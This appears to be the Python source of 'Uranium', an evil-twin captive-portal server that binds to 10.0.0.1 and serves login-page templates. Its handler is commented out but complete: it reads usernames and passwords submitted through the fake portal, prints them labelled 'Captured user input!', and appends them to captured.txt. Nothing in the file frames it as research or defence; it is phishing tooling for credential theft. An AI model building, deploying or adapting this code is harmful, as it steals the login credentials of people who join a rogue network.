from http.server import BaseHTTPRequestHandler, HTTPServer, CGIHTTPRequestHandler
import cgi
import os
from modules.banner import bstring
import argparse
import datetime

parser = argparse.ArgumentParser(description='Uranium http server options help')
parser._action_groups.pop()
requiredNamed = parser.add_argument_group('required') ### REQUIRED ARGS ###
requiredNamed.add_argument(
        "-t",
        "--template",
        type=str,
        required=True,
        help=("Template " +
            "Example: -t [template_name]"))
requiredNamed.add_argument(
        "-p",
        "--port",
        type=str,
        required=True,
        help=("Choose port for python http server. " +
            "All processes on that port will be killed! " + 
            "Example: -p 80"))
optionalNamed = parser.add_argument_group('optional') ### OPTIONAL ARGS ###
optionalNamed.add_argument(
        "-l",
        "--local",
        action='store_true',
        required=False,
        help=("Local mode. " +
            "Uses localhost as default hostname " + 
            "Use if you are making captive portal templates " +
            "Example: -l"))

args = parser.parse_args()

PORT = args.port
template = args.template

if args.local is True:
    HOST_NAME = '127.0.0.1'
    print(bstring.INFO, 'Using local hostname for testing:', HOST_NAME) 
else:
    HOST_NAME = '10.0.0.1'
    print(bstring.INFO, 'Using default hostname for captive portal:', HOST_NAME)


# class Server(BaseHTTPRequestHandler):
#     # html_login = """
#     # <html>
#     # <body>
#     # <script>
#     #     window.onload = function () {
#     #         window.location.href = "index.html";
#     #     }
#     # </script>
#     # </body>
#     # </html>
#     # """

#     # html_redirect = """
#     # <html>
#     # <body>
#     # <script>
#     #     window.onload = function () {
#     #         window.location.href = "login.html";
#     #     }
#     # </script>
#     # </body>
#     # </html>
#     # """

#     def do_GET(self):
        
#         if self.path == "/":
#             self.path = '/templates/%s/index.html' % (template)

#         f = open(self.path[1:]).read()
#         self.send_response(200)
#         self.send_header("Content-type", "text/html")
#         self.end_headers()
#         self.wfile.write(bytes(f, 'utf-8'))

        
#         # path = self.path
        
#     def do_POST(self):
#         self.send_response(200)
#         self.send_header("Content-type", "text/html")
#         self.end_headers()
#         form = cgi.FieldStorage(
#             fp=self.rfile, 
#             headers=self.headers,
#             environ={'REQUEST_METHOD':'POST',
#                      'CONTENT_TYPE':self.headers['Content-Type'],
#                      })
#         current_date = str(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")) 
#         username = form.getvalue("username")
#         password = form.getvalue("password")
#         print("\n" + bstring.CREDS, "Captured user input!")

#         print("""
# ----------------------------
# Date: """ + bstring.BLUE + current_date + bstring.RESET + """
# Username: """ + bstring.GREEN + username + bstring.RESET + """
# Password: """ + bstring.GREEN + password + bstring.RESET + """
# ----------------------------   
# """)    
#         file = open("captured.txt", "a")
#         file.write("""
# Date: """ + current_date + """
# Username: """ + username + """
# Password: """ + password + """
# ----------------------------""")
#         file.close

# if __name__ == "__main__":
#     httpd = HTTPServer((HOST_NAME,PORT),Server)
#     print("\n" + bstring.INFO, "Server started http://%s:%s" % (HOST_NAME,PORT))
#     try:
#         httpd.serve_forever()
#     except KeyboardInterrupt:
#         pass

#     httpd.server_close()
#     print("\n" + bstring.INFO, "Server stopped")